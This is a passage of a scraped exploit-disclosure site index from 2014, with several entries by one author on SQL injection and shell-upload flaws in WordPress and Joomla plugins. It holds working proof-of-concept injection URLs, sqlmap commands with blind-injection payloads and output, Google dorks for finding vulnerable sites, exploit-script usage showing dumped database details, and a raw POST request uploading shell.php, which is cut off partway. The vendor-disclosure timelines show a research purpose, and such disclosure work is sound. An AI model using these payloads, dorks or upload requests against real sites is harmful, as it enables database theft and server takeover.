here.\r# Requirements:\r# 1) Enabled user for management slide\r# 2) python\u0026#39;s httplib2\r# Installation: pip install httplib2 ","permalink":"https://www.homelab.it/index.php/2014/09/16/wordpress-slideshow-gallery-1-4-6-shell-upload-exploit/","summary":"[claudio@localhost ~]$ python wp_gallery_slideshow_146_suv.py -t http://localhost/wordpress -u editor -p editor -f sh33l.php\r$$$$$$\\ $$\\ $$\\ $$\\ $$\\\r$$ __$$\\ $$ |\\__| $$ | $$ |\r$$ / \\__|$$ |$$\\ $$$$$$$ | $$$$$$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$\\ $$\\ $$\\ $$\\\r\\$$$$$$\\ $$ |$$ |$$ __$$ |$$ __$$\\ $$ _____|$$ __$$\\ $$ __$$\\ $$ | $$ | $$ |\r\\____$$\\ $$ |$$ |$$ / $$ |$$$$$$$$ |\\$$$$$$\\ $$ | $$ |$$ / $$ |$$ | $$ | $$ |\r$$\\ $$ |$$ |$$ |$$ | $$ |$$ ____| \\____$$\\ $$ | $$ |$$ | $$ |$$ | $$ | $$ |\r\\$$$$$$ |$$ |$$ |\\$$$$$$$ |\\$$$$$$$\\ $$$$$$$ |$$ | $$ |\\$$$$$$ |\\$$$$$\\$$$$ |\r\\______/ \\__|\\__| \\_______| \\_______|\\_______/ \\__| \\__| \\______/ \\_____\\____/\r$$$$$$\\ $$\\ $$\\ $$\\ $$\\ $$\\ $$$$$$\\\r$$ __$$\\ $$ |$$ | $$$$ |$$ | $$ | $$ __$$\\\r$$ / \\__| $$$$$$\\ $$ |$$ | $$$$$$\\ $$$$$$\\ $$\\ $$\\ \\_$$ |$$ | $$ | $$ / \\__|\r$$ |$$$$\\ \\____$$\\ $$ |$$ |$$ __$$\\ $$ __$$\\ $$ | $$ | $$ |$$$$$$$$ | $$$$$$$\\\r$$ |\\_$$ | $$$$$$$ |$$ |$$ |$$$$$$$$ |$$ | \\__|$$ | $$ | $$ |\\_____$$ | $$ __$$\\\r$$ | $$ |$$ __$$ |$$ |$$ |$$ ____|$$ | $$ | $$ | $$ | $$ | $$ / $$ |\r\\$$$$$$ |\\$$$$$$$ |$$ |$$ |\\$$$$$$$\\ $$ | \\$$$$$$$ | $$$$$$\\ $$\\ $$ |$$\\ $$$$$$ |\r\\______/ \\_______|\\__|\\__| \\_______|\\__| \\____$$ | \\______|\\__|\\__|\\__|\\______/\r$$\\ $$ |\r\\$$$$$$ |\r\\______/\rW0rdpr3ss Sl1d3sh04w G4ll3ry 1.","title":"WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit + Demo"},{"content":"  ######################\r# Exploit Title : Joomla Spider Form Maker \u0026lt;= 3.4 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://web-dorado.com/products/joomla-form.html\r# Dork Google: inurl:com_formmaker\r# Date : 2014-09-07\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://localhost/index.php?option=com_formmaker\u0026amp;view=formmaker\u0026amp;id=[SQLi]\r\u0026#34;id\u0026#34; variable is not sanitized.\r######################\r# Vulnerability Disclosure Timeline:\r2014-09-07: Discovered vulnerability\r2014-09-09: Vendor Notification\r2014-09-10: Vendor Response/Feedback\r2014-09-10: Vendor Fix/Patch\r2014-09-10: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/09/13/joomla-spider-form-maker-4-3-sql-injection/","summary":"######################\r# Exploit Title : Joomla Spider Form Maker \u0026lt;= 3.4 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://web-dorado.com/products/joomla-form.html\r# Dork Google: inurl:com_formmaker\r# Date : 2014-09-07\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://localhost/index.php?option=com_formmaker\u0026amp;view=formmaker\u0026amp;id=[SQLi]\r\u0026#34;id\u0026#34; variable is not sanitized.\r######################\r# Vulnerability Disclosure Timeline:\r2014-09-07: Discovered vulnerability\r2014-09-09: Vendor Notification\r2014-09-10: Vendor Response/Feedback\r2014-09-10: Vendor Fix/Patch\r2014-09-10: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.","title":"Joomla Spider Form Maker 3.4 and below SQL Injection"},{"content":" $$$$$\\ $$\\ $$$$$$\\ $$\\ $$\\\r\\__$$ | $$ | $$ __$$\\ \\__| $$ |\r$$ | $$$$$$\\ $$$$$$\\ $$$$$$\\$$$$\\ $$ | $$$$$$\\ $$ / \\__| $$$$$$\\ $$\\ $$$$$$$ | $$$$$$\\ $$$$$$\\\r$$ |$$ __$$\\ $$ __$$\\ $$ _$$ _$$\\ $$ | \\____$$\\ \\$$$$$$\\ $$ __$$\\ $$ |$$ __$$ |$$ __$$\\ $$ __$$\\\r$$\\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \\____$$\\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \\__|\r$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\r\\$$$$$$ |\\$$$$$$ |\\$$$$$$ |$$ | $$ | $$ |$$ |\\$$$$$$$ | \\$$$$$$ |$$$$$$$ |$$ |\\$$$$$$$ |\\$$$$$$$\\ $$ |\r\\______/ \\______/ \\______/ \\__| \\__| \\__|\\__| \\_______| \\______/ $$ ____/ \\__| \\_______| \\_______|\\__|\r$$ |\r$$ |\r\\__|\r$$$$$$\\ $$\\ $$\\ $$\\ $$$$$$\\ $$$$$$\\\r$$ __$$\\ $$ | $$ | $$$$ | $$ ___$$\\ $$ __$$\\\r$$ / \\__| $$$$$$\\ $$$$$$$\\ $$$$$$\\ $$$$$$\\ $$$$$$$\\ $$$$$$\\ $$$$$$$\\ \\_$$ | \\_/ $$ | $$ / \\__|\r$$ | $$ __$$\\ $$ __$$\\_$$ _| \\____$$\\ $$ _____|\\_$$ _| $$ _____| $$ | $$$$$ / $$$$$$$\\\r$$ | $$ / $$ |$$ | $$ | $$ | $$$$$$$ |$$ / $$ | \\$$$$$$\\ $$ | \\___$$\\ $$ __$$\\\r$$ | $$\\ $$ | $$ |$$ | $$ | $$ |$$\\ $$ __$$ |$$ | $$ |$$\\ \\____$$\\ $$ | $$\\ $$ | $$ / $$ |\r\\$$$$$$ |\\$$$$$$ |$$ | $$ | \\$$$$ |\\$$$$$$$ |\\$$$$$$$\\ \\$$$$ |$$$$$$$ | $$$$$$\\ $$\\$$$$$$ |$$\\ $$$$$$ |\r\\______/ \\______/ \\__| \\__| \\____/ \\_______| \\_______| \\____/ \\_______/ \\______|\\__|\\______/ \\__|\\______/\rj00ml4 Spid3r C0nt4cts \u0026lt;= 1.3.6 SQLi\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Searching for Joomla Spider Contacts vulnerability...\r[+]\r[!] Boolean SQL injection vulnerability FOUND!\r[+]\r[+] Detection version in progress....\r[+]\r[+] EXTENSION VERSION: 1.3.6\r[+]\r[!] http://10.0.0.67 VULNERABLE!!!\r[+]\r[!] DB NAME : joomla\r[!] DB VERS : 5.0.95\r[!] DB USER : pippo@localhost    Exploit Usage 1) Joomla standard path: http://localhost/index.php?option=com_spidercontacts\r[user@localhost ~]$ python j00ml4_spider_contacts_136_sqli.py -H http://localhost\r2) Joomla Custom path: http://localhost/joomla/index.php?option=com_spidercontacts\r[user@localhost ~]$ python j00ml4_spider_contacts_136_sqli.py -H http://localhost -b joomla Download Download Exploit: HERE\nInfo ######################\r# Exploit Title : Joomla Spider Contacts \u0026lt;= 1.3.6 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://web-dorado.com/?option=com_wdsubscriptions\u0026amp;view=dwnldfree\u0026amp;format=row\u0026amp;id=60\r# Mirror Link : https://mega.co.nz/#!mJwlUahJ!fx7d1ZQszaD3-k66PjWQEBXQafJnEeRDEleN8jqbVOE\r# Dork Google: inurl:option=com_spidercontacts\r# Date : 2014-09-07\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://localhost/index.php?option=com_spidercontacts\u0026amp;contact_id=[SQLi]\u0026amp;view=showcontact\u0026amp;lang=ca\r\u0026#34;contact_id\u0026#34; variable is not sanitized.\r######################\r# Vulnerability Disclosure Timeline:\r2014-09-07: Discovered vulnerability\r2014-09-09: Vendor Notification\r2014-09-10: Vendor Response/Feedback\r2014-09-10: Vendor Fix/Patch\r2014-09-10: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/09/10/joomla-spider-contacts-1-3-6-and-below-sql-injection-vulnerability/","summary":"$$$$$\\ $$\\ $$$$$$\\ $$\\ $$\\\r\\__$$ | $$ | $$ __$$\\ \\__| $$ |\r$$ | $$$$$$\\ $$$$$$\\ $$$$$$\\$$$$\\ $$ | $$$$$$\\ $$ / \\__| $$$$$$\\ $$\\ $$$$$$$ | $$$$$$\\ $$$$$$\\\r$$ |$$ __$$\\ $$ __$$\\ $$ _$$ _$$\\ $$ | \\____$$\\ \\$$$$$$\\ $$ __$$\\ $$ |$$ __$$ |$$ __$$\\ $$ __$$\\\r$$\\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \\____$$\\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \\__|\r$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\r\\$$$$$$ |\\$$$$$$ |\\$$$$$$ |$$ | $$ | $$ |$$ |\\$$$$$$$ | \\$$$$$$ |$$$$$$$ |$$ |\\$$$$$$$ |\\$$$$$$$\\ $$ |\r\\______/ \\______/ \\______/ \\__| \\__| \\__|\\__| \\_______| \\______/ $$ ____/ \\__| \\_______| \\_______|\\__|\r$$ |\r$$ |\r\\__|\r$$$$$$\\ $$\\ $$\\ $$\\ $$$$$$\\ $$$$$$\\\r$$ __$$\\ $$ | $$ | $$$$ | $$ ___$$\\ $$ __$$\\\r$$ / \\__| $$$$$$\\ $$$$$$$\\ $$$$$$\\ $$$$$$\\ $$$$$$$\\ $$$$$$\\ $$$$$$$\\ \\_$$ | \\_/ $$ | $$ / \\__|\r$$ | $$ __$$\\ $$ __$$\\_$$ _| \\____$$\\ $$ _____|\\_$$ _| $$ _____| $$ | $$$$$ / $$$$$$$\\\r$$ | $$ / $$ |$$ | $$ | $$ | $$$$$$$ |$$ / $$ | \\$$$$$$\\ $$ | \\___$$\\ $$ __$$\\\r$$ | $$\\ $$ | $$ |$$ | $$ | $$ |$$\\ $$ __$$ |$$ | $$ |$$\\ \\____$$\\ $$ | $$\\ $$ | $$ / $$ |\r\\$$$$$$ |\\$$$$$$ |$$ | $$ | \\$$$$ |\\$$$$$$$ |\\$$$$$$$\\ \\$$$$ |$$$$$$$ | $$$$$$\\ $$\\$$$$$$ |$$\\ $$$$$$ |\r\\______/ \\______/ \\__| \\__| \\____/ \\_______| \\_______| \\____/ \\_______/ \\______|\\__|\\______/ \\__|\\______/\rj00ml4 Spid3r C0nt4cts \u0026lt;= 1.","title":"Joomla Spider Contacts 1.3.6 and below SQL Injection vulnerability"},{"content":" $$$$$\\ $$\\ $$$$$$\\ $$\\ $$\\\r\\__$$ | $$ | $$ __$$\\ \\__| $$ |\r$$ | $$$$$$\\ $$$$$$\\ $$$$$$\\$$$$\\ $$ | $$$$$$\\ $$ / \\__| $$$$$$\\ $$\\ $$$$$$$ | $$$$$$\\ $$$$$$\\\r$$ |$$ __$$\\ $$ __$$\\ $$ _$$ _$$\\ $$ | \\____$$\\ \\$$$$$$\\ $$ __$$\\ $$ |$$ __$$ |$$ __$$\\ $$ __$$\\\r$$\\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \\____$$\\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \\__|\r$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\r\\$$$$$$ |\\$$$$$$ |\\$$$$$$ |$$ | $$ | $$ |$$ |\\$$$$$$$ | \\$$$$$$ |$$$$$$$ |$$ |\\$$$$$$$ |\\$$$$$$$\\ $$ |\r\\______/ \\______/ \\______/ \\__| \\__| \\__|\\__| \\_______| \\______/ $$ ____/ \\__| \\_______| \\_______|\\__|\r$$ |\r$$ |\r\\__|\r$$$$$$\\ $$\\ $$\\ $$$$$$\\ $$$$$$\\ $$$$$$\\\r$$ __$$\\ $$ | $$ | $$ ___$$\\ $$ __$$\\ $$ __$$\\\r$$ / \\__| $$$$$$\\ $$ | $$$$$$\\ $$$$$$$\\ $$$$$$$ | $$$$$$\\ $$$$$$\\ \\_/ $$ | \\__/ $$ | $$ / \\__|\r$$ | \\____$$\\ $$ |$$ __$$\\ $$ __$$\\ $$ __$$ | \\____$$\\ $$ __$$\\ $$$$$ / $$$$$$ | $$$$$$$\\\r$$ | $$$$$$$ |$$ |$$$$$$$$ |$$ | $$ |$$ / $$ | $$$$$$$ |$$ | \\__| \\___$$\\ $$ ____/ $$ __$$\\\r$$ | $$\\ $$ __$$ |$$ |$$ ____|$$ | $$ |$$ | $$ |$$ __$$ |$$ | $$\\ $$ | $$ | $$ / $$ |\r\\$$$$$$ |\\$$$$$$$ |$$ |\\$$$$$$$\\ $$ | $$ |\\$$$$$$$ |\\$$$$$$$ |$$ | \\$$$$$$ |$$\\ $$$$$$$$\\ $$\\ $$$$$$ |\r\\______/ \\_______|\\__| \\_______|\\__| \\__| \\_______| \\_______|\\__| \\______/ \\__|\\________|\\__|\\______/\rj00ml4 Spid3r C4l3nd4r \u0026gt;= 2.x \u0026lt;= 3.2.6 SQLi\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Searching for Joomla Spider Calendar vulnerability...\r[+]\r[!] Boolean SQL injection vulnerability FOUND!\r[+]\r[+] Detection version in progress....\r[+]\r[+] EXTENSION VERSION: 3.2.6\r[+]\r[!] http://10.0.0.67 VULNERABLE!!!\r[+]\r[!] DB NAME : joomla\r[!] DB VERS : 5.0.95\r[!] DB USER : pippo@localhost    Exploit Usage 1) Joomla standard path: http://localhost/index.php?option=com_spidercalendar\r[user@localhost ~]$ python j00ml4_spider_calendar_326_sqli.py -H http://localhost\r2) Joomla Custom path: http://localhost/joomla/index.php?option=com_spidercalendar\r[user@localhost ~]$ python j00ml4_spider_calendar_326_sqli.py -H http://localhost -b joomla Download Download Exploit: HERE\nInfo ######################\r# Exploit Title : Joomla Spider Calendar \u0026lt;= 3.2.6 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://extensions.joomla.org/extensions/calendars-a-events/events/events-calendars/22329\r# Dork Google: inurl:option=com_spidercalendar\r# Date : 2014-08-31\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://localhost/joomla/index.php?option=com_spidercalendar\u0026amp;calendar_id=1 [SQLi]\r\u0026#34;calendar_id\u0026#34; variable is not sanitized.\r######################\r# Vulnerability Disclosure Timeline:\r2014-08-31: Discovered vulnerability\r2014-09-04: Vendor Notification\r2014-09-05: Vendor Response/Feedback\r2014-09-05: Vendor Fix/Patch\r2014-09-05: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/09/06/joomla-spider-calendar-3-2-6-sql-injection-vulnerability/","summary":"$$$$$\\ $$\\ $$$$$$\\ $$\\ $$\\\r\\__$$ | $$ | $$ __$$\\ \\__| $$ |\r$$ | $$$$$$\\ $$$$$$\\ $$$$$$\\$$$$\\ $$ | $$$$$$\\ $$ / \\__| $$$$$$\\ $$\\ $$$$$$$ | $$$$$$\\ $$$$$$\\\r$$ |$$ __$$\\ $$ __$$\\ $$ _$$ _$$\\ $$ | \\____$$\\ \\$$$$$$\\ $$ __$$\\ $$ |$$ __$$ |$$ __$$\\ $$ __$$\\\r$$\\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \\____$$\\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \\__|\r$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\r\\$$$$$$ |\\$$$$$$ |\\$$$$$$ |$$ | $$ | $$ |$$ |\\$$$$$$$ | \\$$$$$$ |$$$$$$$ |$$ |\\$$$$$$$ |\\$$$$$$$\\ $$ |\r\\______/ \\______/ \\______/ \\__| \\__| \\__|\\__| \\_______| \\______/ $$ ____/ \\__| \\_______| \\_______|\\__|\r$$ |\r$$ |\r\\__|\r$$$$$$\\ $$\\ $$\\ $$$$$$\\ $$$$$$\\ $$$$$$\\\r$$ __$$\\ $$ | $$ | $$ ___$$\\ $$ __$$\\ $$ __$$\\\r$$ / \\__| $$$$$$\\ $$ | $$$$$$\\ $$$$$$$\\ $$$$$$$ | $$$$$$\\ $$$$$$\\ \\_/ $$ | \\__/ $$ | $$ / \\__|\r$$ | \\____$$\\ $$ |$$ __$$\\ $$ __$$\\ $$ __$$ | \\____$$\\ $$ __$$\\ $$$$$ / $$$$$$ | $$$$$$$\\\r$$ | $$$$$$$ |$$ |$$$$$$$$ |$$ | $$ |$$ / $$ | $$$$$$$ |$$ | \\__| \\___$$\\ $$ ____/ $$ __$$\\\r$$ | $$\\ $$ __$$ |$$ |$$ ____|$$ | $$ |$$ | $$ |$$ __$$ |$$ | $$\\ $$ | $$ | $$ / $$ |\r\\$$$$$$ |\\$$$$$$$ |$$ |\\$$$$$$$\\ $$ | $$ |\\$$$$$$$ |\\$$$$$$$ |$$ | \\$$$$$$ |$$\\ $$$$$$$$\\ $$\\ $$$$$$ |\r\\______/ \\_______|\\__| \\_______|\\__| \\__| \\_______| \\_______|\\__| \\______/ \\__|\\________|\\__|\\______/\rj00ml4 Spid3r C4l3nd4r \u0026gt;= 2.","title":"Joomla Spider Calendar 3.2.6 SQL Injection Exploit + Demo"},{"content":"  ######################\r# Exploit Title : WordPress Spider Facebook 1.0.8 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://downloads.wordpress.org/plugin/spider-facebook.1.0.8.zip\r# Date : 2014-08-25\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Linux / sqlmap 1.0-dev-5b2ded0\r######################\r# Location : http://localhost/wp-content/plugins/plugins/spider-facebook/facebook.php\r######################\r# Vulnerable code :\rfunction Spider_Facebook_manage()\r{\rrequire_once(\u0026#34;facebook_manager.php\u0026#34;);\rrequire_once(\u0026#34;facbook_manager.html.php\u0026#34;);\rif(!function_exists (\u0026#39;print_html_nav\u0026#39; ))\rrequire_once(\u0026#34;nav_function/nav_html_func.php\u0026#34;);\rglobal $wpdb;\rif(isset($_GET[\u0026#39;id\u0026#39;]))\r{\r$id=$_GET[\u0026#39;id\u0026#39;];\r}\relse\r{\r$id=0;\r}\r######################\r# PoC Exploit:\rhttp://localhost/wordpress/wp-admin/admin.php?page=Spider_Facebook_manage\u0026amp;task=Spider_Facebook_edit\u0026amp;id=1 and 1=2\r# Exploit Code via sqlmap:\rsqlmap --cookie=\u0026#39;INSERT_WORDPRESS_COOKIE_HERE\u0026#39; \\\r-u \u0026#34;http://localhost/wordpress/wp-admin/admin.php?page=Spider_Facebook_manage\u0026amp;task=Spider_Facebook_edit\u0026amp;id=1\u0026#34; -p id --dbms=mysql\r[21:27:40] [INFO] GET parameter \u0026#39;id\u0026#39; is \u0026#39;MySQL \u0026gt; 5.0.11 AND time-based blind\u0026#39; injectable\r...\r...\r...\r---\rPlace: GET\rParameter: id\rType: AND/OR time-based blind\rTitle: MySQL \u0026gt; 5.0.11 AND time-based blind\rPayload: page=Spider_Facebook_manage\u0026amp;task=Spider_Facebook_edit\u0026amp;id=1 AND SLEEP(5)\r---\r# PoC Video:\rhttps://www.youtube.com/watch?v=CcuvHLWnjZo\r######################\r# Vulnerability Disclosure Timeline:\r2014-08-25: Discovered vulnerability\r2014-09-04: Vendor Notification (Web Customers Service Form)\r2014-09-05: Vendor Response/Feedback 2014-09-05: Vendor Fix/Patch 2014-09-05: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/09/05/wordpress-spider-facebook-1-0-8-authenticated-sql-injection/","summary":"######################\r# Exploit Title : WordPress Spider Facebook 1.0.8 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://downloads.wordpress.org/plugin/spider-facebook.1.0.8.zip\r# Date : 2014-08-25\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Linux / sqlmap 1.0-dev-5b2ded0\r######################\r# Location : http://localhost/wp-content/plugins/plugins/spider-facebook/facebook.php\r######################\r# Vulnerable code :\rfunction Spider_Facebook_manage()\r{\rrequire_once(\u0026#34;facebook_manager.php\u0026#34;);\rrequire_once(\u0026#34;facbook_manager.html.php\u0026#34;);\rif(!function_exists (\u0026#39;print_html_nav\u0026#39; ))\rrequire_once(\u0026#34;nav_function/nav_html_func.","title":"WordPress Spider Facebook 1.0.8 Authenticated SQL Injection"},{"content":"  ######################\r# Exploit Title : WordPress Huge-IT Image Gallery 1.0.1 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://huge-it.com/\r# Software Link : http://downloads.wordpress.org/plugin/gallery-images.zip (Fixed)\rMirror Link : https://mega.co.nz/#!3EoUzSQI!yrl75XQsp1ggxDCjW-wq7yUxLdbLu0WHPNFcJAxJOHs\r# Date : 2014-08-25\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Linux / sqlmap 1.0-dev-5b2ded0\r######################\r# Location : http://localhost/wp-content/plugins/gallery-images/admin/gallery_func.php\r######################\r# Vulnerable code :\rfunction editgallery($id)\r{\rglobal $wpdb;\rif(isset($_GET[\u0026#34;removeslide\u0026#34;])){\rif($_GET[\u0026#34;removeslide\u0026#34;] != \u0026#39;\u0026#39;){\r$wpdb-\u0026gt;query(\u0026#34;DELETE FROM \u0026#34;.$wpdb-\u0026gt;prefix.\u0026#34;huge_itgallery_images WHERE id = \u0026#34;.$_GET[\u0026#34;removeslide\u0026#34;].\u0026#34; \u0026#34;);\r}\r}\r######################\r# PoC Exploit:\rhttp://localhost/wordpress/wp-admin/admin.php?page=gallerys_huge_it_gallery\u0026amp;task=edit_cat\u0026amp;id=1\u0026amp;removeslide=1 and 1=2\r# Exploit Code via sqlmap:\rsqlmap --cookie=\u0026#39;INSERT_WORDPRESS_COOKIE_HERE\u0026#39; \\\r-u \u0026#34;http://localhost/wordpress/wp-admin/admin.php?page=gallerys_huge_it_gallery\u0026amp;task=edit_cat\u0026amp;id=1\u0026amp;removeslide=1\u0026#34; \\\r-p removeslide --dbms=mysql --level 3\r[20:38:20] [INFO] GET parameter \u0026#39;removeslide\u0026#39; is \u0026#39;MySQL \u0026gt;= 5.0 time-based blind - Parameter replace\u0026#39; injectable\r...\r...\r...\r---\rPlace: GET\rParameter: removeslide\rType: AND/OR time-based blind\rTitle: MySQL \u0026gt;= 5.0 time-based blind - Parameter replace\rPayload: page=gallerys_huge_it_gallery\u0026amp;task=edit_cat\u0026amp;id=1\u0026amp;removeslide=(SELECT (CASE WHEN (5440=5440) THEN SLEEP(5) ELSE 5440*(SELECT 5440 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))\r---\r# PoC Video:\rhttps://www.youtube.com/watch?v=gAmb0_o3ZUc\r######################\r# Vulnerability Disclosure Timeline:\r2014-08-25: Discovered vulnerability\r2014-08-26: Vendor Notification (Web Customers Service Form)\r2014-08-26: No Response/Feedback 2014-08-01: Plugin version 1.0.1 released without fix 2014-08-02: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/09/02/wordpress-huge-it-image-gallery-1-0-1-sql-injection/","summary":"######################\r# Exploit Title : WordPress Huge-IT Image Gallery 1.0.1 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://huge-it.com/\r# Software Link : http://downloads.wordpress.org/plugin/gallery-images.zip (Fixed)\rMirror Link : https://mega.co.nz/#!3EoUzSQI!yrl75XQsp1ggxDCjW-wq7yUxLdbLu0WHPNFcJAxJOHs\r# Date : 2014-08-25\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Linux / sqlmap 1.0-dev-5b2ded0\r######################\r# Location : http://localhost/wp-content/plugins/gallery-images/admin/gallery_func.php\r######################\r# Vulnerable code :\rfunction editgallery($id)\r{\rglobal $wpdb;\rif(isset($_GET[\u0026#34;removeslide\u0026#34;])){\rif($_GET[\u0026#34;removeslide\u0026#34;] !","title":"WordPress Huge-IT Image Gallery 1.0.1 SQL Injection"},{"content":"  ######################\r# Exploit Title : WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://tribulant.com\r# Software Link : http://downloads.wordpress.org/plugin/slideshow-gallery.1.4.6.zip\r# Date : 2014-08-09\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Description : Any user could upload php files (administrator by default).\r######################\r# Location\rhttp://127.0.0.1/wp-content/plugins/slideshow-gallery/views/admin/slides/save.php\r######################\r# PoC Exploit:\rPOST\rHost=127.0.0.1\rUser-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0\rAccept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language=it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding=gzip, deflate\rReferer=http://127.0.0.1/wp-admin/admin.php?page=slideshow-slides\u0026amp;method=save\u0026amp;id=4\rCookie=wordpress_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407776360%7C538bd40b62d672bbc26a5b5d8a0cf9e5; wp-settings-time-1=1407537471; wp-settings-time-2=1406916594; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse; voted_2=6; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407776360%7Cac34ce538e8b9532559c6940a5d73c04; redux_current_tab=3\rConnection=keep-alive\rContent-Type=multipart/form-data; boundary=---------------------------31064175401770\rContent-Length=1839\rPOSTDATA =-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[id]\u0026#34;\r4\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[order]\u0026#34;\r0\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[title]\u0026#34;\rtitolo_demo\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[description]\u0026#34;\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[showinfo]\u0026#34;\rboth\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[iopacity]\u0026#34;\r70\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[type]\u0026#34;\rfile\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;image_file\u0026#34;; filename=\u0026#34;shell.php\u0026#34;\rContent-Type: 